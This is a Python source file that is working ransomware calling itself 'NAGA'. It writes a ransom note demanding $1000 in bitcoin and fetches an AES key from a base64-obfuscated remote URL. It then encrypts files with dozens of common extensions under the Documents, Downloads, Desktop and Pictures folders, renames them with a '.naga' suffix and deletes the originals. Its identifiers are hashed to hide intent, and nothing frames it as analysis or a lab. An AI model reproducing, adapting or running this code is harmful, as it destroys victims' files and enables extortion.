import os, string, requests, random, base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

def ca9e2a42(f06e3045):
    ca60f9bb = os.path.join(f06e3045, 'README.txt')
    with open(ca60f9bb, 'w') as file:
        file.write('-------[ NAGA HAS COME TO RUIN YOUR DAY ]------\n')
        file.write('Your files have been encrypted.\n')
        file.write('To decrypt them, you need to pay $1000 to the following bitcoin address:\n')
        file.write('1F1tAaz5x1HUXrCNLbtMDqcw6o5GNn4xqX\n')
        file.write('After payment, contact me at this email: SangNagaAbadi@onion.co')
        file.write('I will send you the decryption key.\n')
        file.write('--------------------------------------------------\n')
    
def beff8a73():
    a2d67d50 = ''.join(random.choice(string.ascii_letters) for _ in range(16))
    return a2d67d50
    
def d4c8603d(bd756ae4):
    try:
        ec86af4d = requests.get(bd756ae4)
        return ec86af4d.text.strip().split(':')[1].encode('utf-8')
    except requests.exceptions.RequestException as e:
        print(f"Error fetching key: {e}")
        return None
    
def d62191e0(ed375432, d613b6a0):
    ed375432 = f'{ed375432.split('.')[0]}.{d613b6a0.decode('utf-8')}.{ed375432.split('.')[1]}'.encode('utf-8')
    return base64.urlsafe_b64encode(ed375432).decode('utf-8')

def e6b8aee5(dbe1e3b3, cd3414d9, f1311be5):
    with open(dbe1e3b3, 'rb') as db3ae29e:
        dd75dcf9 = pad(db3ae29e.read(), AES.block_size)
        b0144703 = AES.new(cd3414d9, AES.MODE_CBC, f1311be5)
        f7ff74d9 = b0144703.encrypt(dd75dcf9)
    db3ae29e.close()
    ec3ee179 = os.path.join(os.path.dirname(dbe1e3b3), d62191e0(os.path.basename(dbe1e3b3), f1311be5) + '.naga')
    with open(ec3ee179, 'wb') as d1fcdd0d:
        d1fcdd0d.write(f7ff74d9)
    os.remove(dbe1e3b3)

def dc84a06f():
    for febbef5f, dirnames, ea0f7fcd in os.walk('..'):
        a1f91025 = beff8a73().encode('utf-8')
        if febbef5f.startswith(tuple(cdd84777)):
            ca9e2a42(febbef5f)
            for b030d193 in ea0f7fcd:
                    if b030d193.endswith(tuple(bebee084)) :
                        c8e1ed4d = d4c8603d(e96ffa1f)
                        if not c8e1ed4d:
                            exit(1)
                        e6b8aee5(os.path.join(febbef5f, b030d193), c8e1ed4d, a1f91025)
                    else:
                        continue
        else:
            continue

if __name__ == '__main__':
    cdd84777 = [
        '..\\Documents',
        '..\\Downloads',
        '..\\Desktop',
        '..\\Pictures',
    ]
    bebee084 = [
        ".dll", ".cmd", ".com", ".scr", ".msi", ".js", ".vbs", ".wsf", ".sh", ".mem",                                 
        ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf", ".rtf", ".odt", ".ods", ".odp", 
        ".txt", ".zip", ".rar", ".7z", ".tar", ".gz", ".db", ".sql", ".ini", ".xml", ".json", ".jpg", 
        ".jpeg", ".png", ".gif", ".mp4", ".mp3", ".sys", ".bak", ".log", ".html", ".htm", ".php", ".asp", ".aspx", 
        ".jsp", ".iso", ".vmdk", ".ova", ".pem", ".crt", ".key", ".eml", ".msg"
    ]

    e96ffa1f = (base64.b64decode(b'aHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9IYWFsbG9vYmltL2VmOTk0MTkwYTY2ZGNlOTUwNmEwY2ZmNTBkY2JjNjM3L3Jhdy9mNTQyZjhjYWJlNDUwMmM3MmU2MTQzNTRlZDMxMGI2NDQ0NmNkYWU4L2tleS50eHQ=')).decode('utf-8')
    dc84a06f()
